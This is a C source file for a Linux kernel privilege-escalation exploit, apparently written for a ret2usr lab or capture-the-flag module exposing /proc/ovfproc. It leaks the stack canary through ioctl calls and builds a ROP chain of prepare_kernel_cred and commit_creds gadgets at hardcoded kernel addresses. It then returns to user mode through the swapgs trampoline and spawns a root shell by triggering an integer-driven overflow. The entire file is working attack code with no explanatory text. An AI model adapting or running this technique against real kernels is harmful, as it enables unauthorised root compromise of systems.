//gcc -Os -static -masm=intel exploit.c -lutil -o exploit
//home/overflow/ret2usr/exploit
#include "mykernelpwn.h"

#define pop_rdi_ret 0xffffffff81060be1
#define pop_rsi_ret 0xffffffff811c30fe

#define init_cred 0xffffffff826672a0
#define commit_creds 0xffffffff810d49b0
#define prepare_kernel_cred 0xffffffff810d4c60
#define swapgs_restore_regs_and_return_to_usermode 0xffffffff81c00ff0

void ovf_read(int fd, char* buf)
{
    ioctl(fd, 0x112233, buf);
}

void set_offset(int fd, long offset)
{
    ioctl(fd, 0x334455, offset);
}

void ovf_copy_func(int fd, long len)
{
    ioctl(fd, 0x223344, len);
}

int main(int argc, char** argv)
{
    bind_core(0);
    save_status();

    int fd = open("/proc/ovfproc", 2);
    if(fd <0)
    {
        printf("\033[31m\033[1m[-] Failed to open the file: /proc/ovfproc!\033[0m\n");
        exit(-1);
    }

    // get the canary
    size_t canary;
    char buf[0x50];

    set_offset(fd, 64);
    ovf_read(fd, buf);
    
    canary = ((size_t *)buf)[0];
    printf("\033[32m\033[1m[+] Successful to get the value of canary: %p\033[0m\n", canary);

    // construct the ropchain
    size_t rop_chain[0x100], buf_rop[0x100], i = 0;
    for(; i < 10; i++)
        rop_chain[i] = canary;
    rop_chain[i++] = pop_rdi_ret;
    rop_chain[i++] = prepare_kernel_cred;
    rop_chain[i++] = pop_rsi_ret;
    rop_chain[i++] = commit_creds;
    rop_chain[i++] = (size_t)get_root_privilige;
    rop_chain[i++] = swapgs_restore_regs_and_return_to_usermode+22;
    rop_chain[i++] = 0;
    rop_chain[i++] = 0;
    rop_chain[i++] = (size_t)get_root_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp + 8;
    rop_chain[i++] = user_ss;

    write(fd, rop_chain, 0x100);
    read(fd, buf_rop, 0x100);
    print_binary(buf_rop, 0x100);
    
    ovf_copy_func(fd, 0xffffffffffff0000 | (0x100)); // 转换无符号16位为0x100
    close(fd);
}
